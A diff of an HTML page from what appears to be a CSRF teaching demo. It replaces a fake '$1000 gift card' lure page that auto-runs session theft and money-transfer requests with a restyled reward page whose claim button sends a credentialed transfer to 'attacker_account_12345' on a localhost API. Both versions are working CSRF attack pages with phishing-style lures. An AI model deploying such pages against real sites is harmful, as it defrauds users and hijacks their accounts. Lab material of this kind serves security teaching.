@@ -1,397 +1,197 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Free Gift Card Generator - Claim Your Prize!</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            max-width: 600px;
-            width: 100%;
-            padding: 40px;
-            animation: slideIn 0.5s ease-out;
-        }
-        
-        @keyframes slideIn {
-            from {
-                opacity: 0;
-                transform: translateY(-20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .header h1 {
-            color: #667eea;
-            font-size: 2.5em;
-            margin-bottom: 10px;
-        }
-        
-        .header p {
-            color: #666;
-            font-size: 1.1em;
-        }
-        
-        .gift-box {
-            text-align: center;
-            font-size: 5em;
-            margin: 30px 0;
-            animation: bounce 2s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-20px); }
-        }
-        
-        .info-box {
-            background: #f0f4ff;
-            border-left: 4px solid #667eea;
-            padding: 20px;
-            margin: 20px 0;
-            border-radius: 8px;
-        }
-        
-        .info-box h3 {
-            color: #667eea;
-            margin-bottom: 10px;
-        }
-        
-        .info-box p {
-            color: #555;
-            line-height: 1.6;
-        }
-        
-        .attack-log {
-            background: #1a1a1a;
-            color: #0f0;
-            padding: 20px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.9em;
-            margin-top: 20px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-        
-        .attack-log h4 {
-            color: #ff6b6b;
-            margin-bottom: 10px;
-            font-size: 1.1em;
-        }
-        
-        .log-entry {
-            margin: 5px 0;
-            padding: 5px;
-            border-left: 2px solid #0f0;
-            padding-left: 10px;
-        }
-        
-        .log-entry.error {
-            border-left-color: #ff6b6b;
-            color: #ff6b6b;
-        }
-        
-        .log-entry.success {
-            border-left-color: #51cf66;
-            color: #51cf66;
-        }
-        
-        .log-entry.info {
-            border-left-color: #4dabf7;
-            color: #4dabf7;
-        }
-        
-        .warning {
-            background: #fff3cd;
-            border: 2px solid #ffc107;
-            color: #856404;
-            padding: 15px;
-            border-radius: 8px;
-            margin-top: 20px;
-            font-weight: bold;
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.1em;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 20px;
-            transition: transform 0.2s;
-        }
-        
-        button:hover {
-            transform: scale(1.05);
-        }
-        
-        button:active {
-            transform: scale(0.95);
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎁 Exclusive Reward Center</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Poppins', sans-serif;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden;
+    background: linear-gradient(-45deg, #667eea, #764ba2, #6a11cb, #2575fc);
+    background-size: 400% 400%;
+    animation: gradientMove 12s ease infinite;
+}
+
+@keyframes gradientMove {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+}
+
+.container {
+    width: 520px;
+    backdrop-filter: blur(20px);
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 25px;
+    padding: 40px;
+    box-shadow: 0 30px 60px rgba(0,0,0,0.3);
+    border: 1px solid rgba(255,255,255,0.2);
+    color: white;
+    animation: fadeIn 1s ease;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(30px); }
+    to { opacity: 1; transform: translateY(0); }
+}
+
+h1 {
+    font-size: 32px;
+    font-weight: 700;
+    text-align: center;
+    margin-bottom: 10px;
+}
+
+.subtitle {
+    text-align: center;
+    font-weight: 300;
+    opacity: 0.9;
+    margin-bottom: 30px;
+}
+
+.gift {
+    font-size: 70px;
+    text-align: center;
+    animation: bounce 2s infinite;
+}
+
+@keyframes bounce {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-15px); }
+}
+
+.claim-btn {
+    width: 100%;
+    padding: 15px;
+    margin-top: 25px;
+    border-radius: 12px;
+    border: none;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    background: linear-gradient(135deg, #ff9966, #ff5e62);
+    color: white;
+    transition: 0.3s;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+}
+
+.claim-btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+}
+
+.attack-console {
+    margin-top: 25px;
+    background: rgba(0,0,0,0.7);
+    border-radius: 15px;
+    padding: 15px;
+    height: 200px;
+    overflow-y: auto;
+    font-family: monospace;
+    font-size: 13px;
+}
+
+.log-entry {
+    margin-bottom: 6px;
+}
+
+.info { color: #4dabf7; }
+.success { color: #51cf66; }
+.error { color: #ff6b6b; }
+
+.warning {
+    margin-top: 20px;
+    font-size: 12px;
+    opacity: 0.8;
+    text-align: center;
+}
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>🎁 Congratulations!</h1>
-            <p>You've won a $1000 Gift Card!</p>
-        </div>
-        
-        <div class="gift-box">🎁</div>
-        
-        <div class="info-box">
-            <h3>🎉 Claim Your Prize Now!</h3>
-            <p>
-                You've been selected as our lucky winner! Click the button below to claim your 
-                $1000 gift card instantly. No purchase necessary!
-            </p>
-        </div>
-        
-        <div class="attack-log" id="attackLog">
-            <h4>🔍 Attack Activity Log:</h4>
-            <div id="logEntries"></div>
-        </div>
-        
-        <div class="warning">
-            ⚠️ <strong>EDUCATIONAL DEMO:</strong> This is a simulated CSRF attack site for educational purposes only.
-            In a real attack, this page would look legitimate and hide all attack activity.
-        </div>
-        
-        <!-- Hidden CSRF Attack Form -->
-        <form id="csrfForm" action="http://localhost:5000/api/attack/csrf/transfer" method="POST" class="hidden">
-            <input type="hidden" name="to" value="attacker_account_12345">
-            <input type="hidden" name="amount" value="10000">
-        </form>
-        
-        <!-- Hidden Image Tag for GET Request Attack -->
-        <img id="csrfImage" src="" class="hidden" width="0" height="0">
-    </div>
-    
-    <script>
-        const API_BASE = 'http://localhost:5000/api/attack/csrf';
-        const logEntries = document.getElementById('logEntries');
-        
-        function log(message, type = 'info') {
-            const entry = document.createElement('div');
-            entry.className = `log-entry ${type}`;
-            const timestamp = new Date().toLocaleTimeString();
-            entry.textContent = `[${timestamp}] ${message}`;
-            logEntries.appendChild(entry);
-            logEntries.scrollTop = logEntries.scrollHeight;
-        }
-        
-        function logJSON(data, label) {
-            log(`${label}: ${JSON.stringify(data, null, 2)}`, 'info');
-        }
-        
-        // Step 1: Steal Session Information
-        async function stealSessionInfo() {
-            log('🔓 Step 1: Attempting to steal session information...', 'info');
-            try {
-                const response = await fetch(`${API_BASE}/session-info`, {
-                    method: 'GET',
-                    credentials: 'include', // Include cookies
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                });
-                
-                const data = await response.json();
-                log('✅ Successfully retrieved session information!', 'success');
-                logJSON(data, 'Session Data');
-                
-                // Extract session ID
-                const sessionId = data.sessionId;
-                const cookies = data.cookies;
-                
-                log(`📋 Session ID: ${sessionId}`, 'success');
-                log(`🍪 Cookies: ${JSON.stringify(cookies)}`, 'success');
-                
-                return { sessionId, cookies, data };
-            } catch (error) {
-                log(`❌ Failed to steal session: ${error.message}`, 'error');
-                return null;
-            }
-        }
-        
-        // Step 2: Steal User Profile
-        async function stealProfile() {
-            log('👤 Step 2: Attempting to steal user profile...', 'info');
-            try {
-                const response = await fetch(`${API_BASE}/profile`, {
-                    method: 'GET',
-                    credentials: 'include',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    }
-                });
-                
-                const data = await response.json();
-                log('✅ Successfully retrieved user profile!', 'success');
-                logJSON(data, 'Profile Data');
-                
-                return data;
-            } catch (error) {
-                log(`❌ Failed to steal profile: ${error.message}`, 'error');
-                return null;
-            }
-        }
-        
-        // Step 3: Perform CSRF Transfer Attack (POST)
-        async function performCSRFAttack() {
-            log('💰 Step 3: Performing CSRF money transfer attack...', 'info');
-            try {
-                const response = await fetch(`${API_BASE}/transfer`, {
-                    method: 'POST',
-                    credentials: 'include', // Automatically includes cookies
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        to: 'attacker_account_12345',
-                        amount: 10000
-                    })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    log('✅ CSRF ATTACK SUCCESSFUL!', 'success');
-                    log(`💰 Transferred $${data.amount} to ${data.to}`, 'success');
-                    logJSON(data, 'Transfer Response');
-                } else {
-                    log(`⚠️ Transfer response: ${JSON.stringify(data)}`, 'error');
-                }
-                
-                return data;
-            } catch (error) {
-                log(`❌ CSRF attack failed: ${error.message}`, 'error');
-                return null;
-            }
-        }
-        
-        // Step 4: Perform CSRF Attack via GET (Image Tag)
-        function performCSRFAttackGET() {
-            log('🖼️ Step 4: Attempting CSRF attack via GET (Image Tag)...', 'info');
-            const img = document.getElementById('csrfImage');
-            img.src = `${API_BASE}/transfer?to=attacker_account_12345&amount=5000`;
-            img.onload = () => {
-                log('✅ GET request sent via image tag!', 'success');
-            };
-            img.onerror = () => {
-                log('⚠️ Image tag request completed (may have failed)', 'info');
-            };
-        }
-        
-        // Step 5: Form Auto-Submit Attack
-        function performFormAttack() {
-            log('📝 Step 5: Attempting form auto-submit attack...', 'info');
-            const form = document.getElementById('csrfForm');
-            try {
-                form.submit();
-                log('✅ Form submitted!', 'success');
-            } catch (error) {
-                log(`❌ Form submission failed: ${error.message}`, 'error');
-            }
-        }
-        
-        // Execute all attacks sequentially
-        async function executeAllAttacks() {
-            log('🚨 Starting CSRF Attack Sequence...', 'error');
-            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
-            
-            // Wait a bit for page to fully load
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            // Steal session info
-            const sessionData = await stealSessionInfo();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            // Steal profile
-            const profileData = await stealProfile();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            // Perform POST CSRF attack
-            const transferResult = await performCSRFAttack();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            // Perform GET CSRF attack
-            performCSRFAttackGET();
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            
-            // Form attack (this will navigate away, so do it last)
-            // performFormAttack();
-            
-            log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'info');
-            log('✅ Attack sequence completed!', 'success');
-            
-            // Summary
-            if (sessionData && transferResult && transferResult.success) {
-                log('', 'info');
-                log('📊 ATTACK SUMMARY:', 'error');
-                log(`   ✓ Session ID Stolen: ${sessionData.sessionId}`, 'success');
-                log(`   ✓ Money Transferred: $${transferResult.amount}`, 'success');
-                log(`   ✓ Recipient: ${transferResult.to}`, 'success');
-                log('', 'info');
-                log('⚠️ In a real attack, the attacker would now have:', 'error');
-                log('   • Your session ID', 'error');
-                log('   • Ability to perform actions as you', 'error');
-                log('   • Access to your account', 'error');
-            }
-        }
-        
-        // Auto-execute attacks when page loads
-        window.addEventListener('load', () => {
-            log('🌐 Malicious site loaded...', 'info');
-            log('⏳ Waiting for user interaction...', 'info');
-            
-            // Execute attacks after a short delay
-            setTimeout(() => {
-                executeAllAttacks();
-            }, 2000);
+
+<div class="container">
+    <h1>🎉 Exclusive Reward Unlocked!</h1>
+    <p class="subtitle">You have been selected for a $1000 Gift Card</p>
+
+    <div class="gift">🎁</div>
+
+    <button class="claim-btn" onclick="performCSRFAttack()">
+        Claim My Reward Now
+    </button>
+
+    <div class="attack-console" id="console"></div>
+
+   
+</div>
+
+<script>
+
+const USE_SECURE_ENDPOINTS = false;
+
+const API_BASE = USE_SECURE_ENDPOINTS
+    ? 'http://localhost:5000/api/secure/csrf'
+    : 'http://localhost:5000/api/attack/csrf';
+
+const consoleDiv = document.getElementById("console");
+
+function log(message, type="info") {
+    const entry = document.createElement("div");
+    entry.className = "log-entry " + type;
+    const time = new Date().toLocaleTimeString();
+    entry.textContent = `[${time}] ${message}`;
+    consoleDiv.appendChild(entry);
+    consoleDiv.scrollTop = consoleDiv.scrollHeight;
+}
+
+async function performCSRFAttack() {
+    log("🚨 Initiating background transaction...", "error");
+
+    try {
+        const response = await fetch(`${API_BASE}/transfer`, {
+            method: "POST",
+            credentials: "include",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                to: "attacker_account_12345",
+                amount: 10000
+            })
         });
-        
-        // Also execute on button click (if user adds one)
-        document.addEventListener('click', (e) => {
-            if (e.target.tagName === 'BUTTON') {
-                log('👆 User clicked button - executing attacks...', 'info');
-                executeAllAttacks();
-            }
-        });
-    </script>
+
+        const data = await response.json();
+
+        if (data.success) {
+            log("✅ Transaction completed successfully", "success");
+            log(`💰 ₹${data.amount} transferred`, "success");
+            log(`⚠️ Updated Balance: ${data.newBalance}`, "error");
+        } else {
+            log("🛡️ CSRF Protection Active — Attack Blocked", "success");
+        }
+
+    } catch (err) {
+        log("❌ Attack failed: " + err.message, "error");
+    }
+}
+
+window.addEventListener("load", () => {
+    log("🌐 Malicious reward portal loaded", "info");
+});
+</script>
+
 </body>
 </html>
